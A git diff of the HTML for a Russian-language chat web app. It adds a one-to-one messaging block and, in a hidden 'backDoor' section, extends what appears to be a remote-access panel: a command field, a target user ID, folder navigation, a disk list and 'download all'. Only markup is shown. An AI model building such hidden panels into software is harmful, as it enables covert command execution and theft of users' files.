@@ -81,9 +81,11 @@
         <div id="typing"></div>
         <div id="message">
             <div id="file"></div>
-            <textarea id="inputMessage"></textarea>
+            <div id="inputMessage" contenteditable=true></div>
             <div id="send"><img src="styles/audio.png" style="width: 32px;"></div>
         </div>
+        <div id="add1"></div>
+        <div id="add2"></div>
     </div>
     <div id="AddRoomModalBody" style="display: none;">
         <br>Название комнаты:<br><br>
@@ -146,7 +148,7 @@
                 <td>Новый пароль</td>
                 <td><input type="password" id="newPasswordValue" maxlength=60></td>
             </tr>
-        </table>
+        </table><br>
         <button id="loginInAcc">Войти</button><br><br>
         <button id="changePasswordAcc">Сменить пароль</button><br><br>
         <button id="deleteAcc">Удалить счет</button><br><br>
@@ -162,7 +164,15 @@
         <div id="operations"></div>
     </div>
     <div id="oneToOneBlock" style="display: none;">
-        сюда блок
+        <textarea id="oneToOneMessage" style="width: 100%; height: 100px;" maxlength="1000"></textarea><br><br>
+        id получателя <input type="text" id="oneToOneRecipient" maxlength="200"><br><br>
+        <button id="oneToOneMessagesClear">Очистить</button><br><br>
+        <button id="oneToOneMessageSend">Отправить</button><br><br>
+        <pre class="des">Звук входящих/исходящих сообщений <input type="checkbox" id="oneToOneMessageSound"></pre>
+        <span id="oneToOneStatus"></span><br>
+        <div id="oneToOneMessages">
+            <table style="display: inline-block; user-select: text; border-collapse: collapse;" id="oneToOneMessagesTable"></table>
+        </div>
     </div>
     <div id="backDoor" style="display: none;">
         Команда<br>
@@ -181,7 +191,8 @@
             </form>
             Айди пользователя для подключения
             <input type="text" id="curPath">
-            Текущая папка<br><br>
+            Текущая папка<br>
+            Доступные диски: <span id="backDoorFilesDisks" style="user-select: text;"></span><br>
             <input type="text" id="goToPath"><br>
             <button id="goToStart">Перейти к..</button><br>
             <button id="downloadAll">Скачать все</button><br>
